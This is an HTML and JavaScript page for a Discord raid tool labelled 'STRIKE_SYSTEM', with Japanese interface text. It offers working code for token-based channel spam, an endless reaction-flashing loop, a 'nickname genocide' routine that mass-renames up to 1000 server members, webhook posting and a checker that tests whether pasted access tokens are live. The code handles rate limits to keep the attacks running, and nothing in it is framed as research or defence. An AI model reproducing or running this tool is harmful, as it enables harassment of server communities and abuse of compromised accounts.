<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STRIKE_BLUE_FINAL_NICK</title>
    <style>
        :root {
            --bg: #050a0f;
            --side: #0a141e;
            --card: #0f1d2a;
            --accent: #00aaff;
            --danger: #ff2e63;
            --text: #e0f2ff;
            --font: 'Meiryo', sans-serif;
        }

        /* 枠越え防止の鉄則 */
        * { box-sizing: border-box; }

        body { 
            font-family: var(--font); 
            margin: 0; 
            background: var(--bg); 
            color: var(--text); 
            display: flex; 
            height: 100vh; 
            overflow: hidden; 
        }

        body::before {
            content: ""; position: absolute; width: 100%; height: 100%;
            background-image: radial-gradient(rgba(0, 170, 255, 0.07) 1px, transparent 1px);
            background-size: 25px 25px; z-index: -1;
        }

        .menu-btn { 
            position: fixed; top: 10px; left: 10px; font-size: 14px; 
            cursor: pointer; z-index: 100; border: 1px solid var(--accent); 
            background: rgba(0, 170, 255, 0.1); color: var(--accent); 
            padding: 8px 12px; border-radius: 4px; 
        }
        
        .sidebar { 
            position: fixed; top: 0; left: -260px; width: 260px; height: 100%; 
            background: var(--side); transition: 0.3s cubic-bezier(0.16, 1, 0.3, 1); 
            z-index: 90; padding-top: 60px; border-right: 1px solid var(--accent); 
        }
        .sidebar.open { left: 0; }
        .sidebar h3 { padding: 20px; color: var(--accent); font-size: 0.8rem; letter-spacing: 2px; }
        .sidebar button { 
            width: 100%; padding: 15px 20px; background: none; border: none; 
            color: #507080; text-align: left; font-size: 0.9rem; cursor: pointer; 
            border-bottom: 1px solid #1a2a3a; 
        }
        .sidebar button.active { color: #fff; background: rgba(0, 170, 255, 0.2); border-left: 6px solid var(--accent); }

        .content { 
            flex-grow: 1; padding: 60px 10px; display: flex; 
            flex-direction: column; align-items: center; 
            overflow-y: auto; width: 100%; 
        }
        
        .card { 
            background: var(--card); width: 100%; max-width: 500px; 
            padding: 20px; border-radius: 8px; border: 1px solid rgba(0, 170, 255, 0.3); 
            display: none; margin-bottom: 30px; box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        .card.active { display: block; }

        h2 { margin-top: 0; color: var(--accent); font-size: 1.1rem; border-bottom: 2px solid var(--accent); padding-bottom: 8px; margin-bottom: 15px; }
        label { display: block; margin-top: 12px; margin-bottom: 5px; font-size: 0.75rem; color: var(--accent); font-weight: bold; }
        
        input, textarea { 
            width: 100%; max-width: 100%; padding: 10px; background: #07111a; 
            border: 1px solid #1a3a5a; color: #fff; border-radius: 4px; outline: none; font-size: 0.9rem;
        }

        .input-row { display: flex; gap: 10px; flex-wrap: wrap; }
        .input-row > div { flex: 1; min-width: 100px; }

        .btn-group { display: flex; gap: 8px; margin-top: 20px; flex-wrap: wrap; }
        .btn { 
            flex: 1; min-width: 120px; padding: 12px; border: 1px solid var(--accent); 
            background: rgba(0, 170, 255, 0.1); color: var(--accent); 
            font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 0.9rem;
        }
        .btn:hover { background: var(--accent); color: #000; }
        .btn-danger { border-color: var(--danger); color: var(--danger); }
        .btn-danger:hover { background: var(--danger); color: #fff; }

        .log-container {
            margin-top: 20px; background: #03080c; border: 1px solid #1a3a5a; 
            border-radius: 4px; height: 200px; overflow-y: auto; padding: 10px; 
            font-size: 0.75rem; border-left: 3px solid var(--accent);
        }
        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #0a1a2a; padding-bottom: 3px; display: flex; gap: 5px; }
        .success { color: #00ffcc; }
        .fail { color: var(--danger); }
        .info { color: #00d4ff; }
        .time { color: #507080; min-width: 60px; }
    </style>
</head>
<body>

    <button class="menu-btn" onclick="toggleMenu()">☰ MENU</button>

    <div class="sidebar" id="sidebar">
        <h3>STRIKE_SYSTEM</h3>
        <button onclick="showTab('webhook')" id="tab-webhook">WebHook送信</button>
        <button onclick="showTab('spam')" id="tab-spam">トクーンスパム</button>
        <button onclick="showTab('reaction')" id="tab-reaction">リアクション点滅</button>
        <button onclick="showTab('nick')" id="tab-nick">ニックネーム一括</button>
        <button onclick="showTab('checker')" id="tab-checker" class="active">トクーンチェッカー</button>
    </div>

    <div class="content" onclick="closeMenu()">
        
        <div id="webhook" class="card">
            <h2>> WebHook送信</h2>
            <label>ターゲットURL</label>
            <input type="text" id="wh-url" oninput="autoSave()">
            <label>メッセージ内容</label>
            <textarea id="wh-msg" placeholder="内容を入力"></textarea>
            <button class="btn" onclick="sendWebhook()">送信を実行</button>
            <div class="log-container" id="wh-log"></div>
        </div>

        <div id="spam" class="card">
            <h2>> トクーンスパム</h2>
            <label>アクセストークン</label>
            <input type="text" id="spam-token" oninput="autoSave()">
            <label>チャンネルID</label>
            <input type="text" id="spam-channel" oninput="autoSave()">
            <label>メッセージ</label>
            <textarea id="spam-msg" oninput="autoSave()"></textarea>
            <div class="input-row">
                <div><label>回数</label><input type="number" id="spam-count" value="100"></div>
                <div><label>間隔(ms)</label><input type="number" id="spam-delay" value="1000"></div>
            </div>
            <div class="btn-group">
                <button class="btn btn-danger" id="spam-start" onclick="startSpam()">攻撃開始</button>
                <button class="btn" onclick="stopAll()">緊急停止</button>
            </div>
            <div class="log-container" id="spam-log"></div>
        </div>

        <div id="reaction" class="card">
            <h2>> リアクション無限点滅</h2>
            <label>アクセストークン</label>
            <input type="text" id="re-token" oninput="autoSave()">
            <label>ChID / MsgID</label>
            <div class="input-row">
                <input type="text" id="re-channel" oninput="autoSave()">
                <input type="text" id="re-msgid" oninput="autoSave()">
            </div>
            <label>絵文字</label>
            <input type="text" id="re-emoji" value="🔥" oninput="autoSave()">
            <div class="btn-group">
                <button class="btn btn-danger" id="re-start" onclick="startReaction()">無限点滅開始</button>
                <button class="btn" onclick="stopAll()">緊急停止</button>
            </div>
            <div class="log-container" id="re-log"></div>
        </div>

        <div id="nick" class="card">
            <h2>> ニックネーム・ジェノサイド</h2>
            <label>アクセストークン</label>
            <input type="text" id="nick-token" oninput="autoSave()">
            <label>サーバーID</label>
            <input type="text" id="nick-guild" oninput="autoSave()">
            <label>新ニックネーム</label>
            <input type="text" id="nick-name" placeholder="Strikeに支配された" oninput="autoSave()">
            <div class="btn-group">
                <button class="btn btn-danger" id="nick-start" onclick="startNickGenocide(false)">一括変更開始</button>
                <button class="btn" onclick="startNickGenocide(true)">全員リセット</button>
                <button class="btn" onclick="stopAll()">停止</button>
            </div>
            <div class="log-container" id="nick-log"></div>
        </div>

        <div id="checker" class="card active">
            <h2>> トクーンチェッカー</h2>
            <input type="text" id="check-input" placeholder="貼り付け">
            <button class="btn" onclick="runCheck()">スキャン実行</button>
            <div class="log-container" id="check-log"></div>
        </div>
    </div>

    <script>
        let loopActive = false;

        function toggleMenu() { document.getElementById('sidebar').classList.toggle('open'); }
        function closeMenu() { document.getElementById('sidebar').classList.remove('open'); }
        function showTab(tabId) {
            document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
            document.querySelectorAll('.sidebar button').forEach(b => b.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            document.getElementById('tab-' + tabId).classList.add('active');
            closeMenu();
        }

        function addLog(id, msg, type='') {
            const box = document.getElementById(id);
            const entry = document.createElement('div');
            entry.className = 'log-entry ' + type;
            const time = new Date().toLocaleTimeString();
            entry.innerHTML = `<span class="time">[${time}]</span><span>${msg}</span>`;
            box.prepend(entry);
        }

        function stopAll() { loopActive = false; }

        function autoSave() {
            const fields = ['wh-url', 'spam-token', 'spam-channel', 'spam-msg', 're-token', 're-channel', 're-msgid', 're-emoji', 'nick-token', 'nick-guild', 'nick-name'];
            fields.forEach(f => localStorage.setItem(f, document.getElementById(f).value));
        }

        window.onload = () => {
            const fields = ['wh-url', 'spam-token', 'spam-channel', 'spam-msg', 're-token', 're-channel', 're-msgid', 're-emoji', 'nick-token', 'nick-guild', 'nick-name'];
            fields.forEach(f => {
                const val = localStorage.getItem(f);
                if(val) document.getElementById(f).value = val;
            });
        };

        // --- ニックネーム操作ロジック強化版 ---
        async function startNickGenocide(isReset) {
            const token = document.getElementById('nick-token').value;
            const guildId = document.getElementById('nick-guild').value;
            const newNick = isReset ? null : document.getElementById('nick-name').value;
            if(!token || !guildId) return addLog('nick-log', '情報不足', 'fail');

            loopActive = true;
            addLog('nick-log', 'メンバー一覧取得中...', 'info');

            try {
                const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/members?limit=1000`, {
                    headers: {'Authorization': token}
                });
                
                if(!res.ok) return addLog('nick-log', '取得失敗（IDミスかトークン無効）', 'fail');
                const members = await res.json();
                addLog('nick-log', `${members.length}名を補足。実行します...`, 'info');

                for(const m of members) {
                    if(!loopActive) break;
                    try {
                        const patchRes = await fetch(`https://discord.com/api/v9/guilds/${guildId}/members/${m.user.id}`, {
                            method: 'PATCH',
                            headers: {'Authorization': token, 'Content-Type': 'application/json'},
                            body: JSON.stringify({nick: newNick})
                        });

                        if(patchRes.status === 200 || patchRes.status === 204) {
                            addLog('nick-log', `成功: ${m.user.username}`, 'success');
                        } else if(patchRes.status === 403) {
                            addLog('nick-log', `不可: ${m.user.username} (役職の順位不足)`, 'fail');
                        } else if(patchRes.status === 429) {
                            const wait = (await patchRes.json()).retry_after;
                            addLog('nick-log', `制限: ${wait}秒待機`, 'fail');
                            await new Promise(r => setTimeout(r, wait * 1000));
                        }
                    } catch(e) {}
                    await new Promise(r => setTimeout(r, 200));
                }
                addLog('nick-log', 'シーケンス完了', 'info');
            } catch(e) { addLog('nick-log', 'エラー発生', 'fail'); }
            loopActive = false;
        }

        // --- 他の機能 (スパム等) ---
        async function startSpam() {
            const t = document.getElementById('spam-token').value;
            const c = document.getElementById('spam-channel').value;
            const m = document.getElementById('spam-msg').value;
            const count = parseInt(document.getElementById('spam-count').value);
            const delay = parseInt(document.getElementById('spam-delay').value);
            loopActive = true;
            for(let i=0; i<count; i++){
                if(!loopActive) break;
                const res = await fetch(`https://discord.com/api/v9/channels/${c}/messages`, {
                    method: 'POST', headers: {'Authorization': t, 'Content-Type': 'application/json'},
                    body: JSON.stringify({content: m})
                });
                addLog('spam-log', `回数:${i+1} ${res.ok ? '成功' : '失敗'}`, res.ok ? 'success' : 'fail');
                await new Promise(r => setTimeout(r, delay));
            }
            loopActive = false;
        }

        async function startReaction() {
            const t = document.getElementById('re-token').value;
            const c = document.getElementById('re-channel').value;
            const m = document.getElementById('re-msgid').value;
            const e = encodeURIComponent(document.getElementById('re-emoji').value);
            const url = `https://discord.com/api/v9/channels/${c}/messages/${m}/reactions/${e}/@me`;
            loopActive = true;
            while(loopActive){
                const p = await fetch(url, {method: 'PUT', headers: {'Authorization': t}});
                if(p.status === 429) { await new Promise(r => setTimeout(r, 2000)); continue; }
                addLog('re-log', '付与', 'success');
                await new Promise(r => setTimeout(r, 450));
                await fetch(url, {method: 'DELETE', headers: {'Authorization': t}});
                addLog('re-log', '削除', 'info');
                await new Promise(r => setTimeout(r, 450));
            }
        }

        async function sendWebhook() {
            const u = document.getElementById('wh-url').value;
            const c = document.getElementById('wh-msg').value;
            const res = await fetch(u, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: c})});
            addLog('wh-log', res.ok ? '送信完了' : '失敗', res.ok ? 'success' : 'fail');
        }

        async function runCheck() {
            const t = document.getElementById('check-input').value;
            const res = await fetch('https://discord.com/api/v9/users/@me', {headers: {'Authorization': t}});
            if(res.ok) {
                const d = await res.json();
                addLog('check-log', `生存: ${d.username}`, 'success');
            } else addLog('check-log', '死亡', 'fail');
        }
    </script>
</body>
</html>
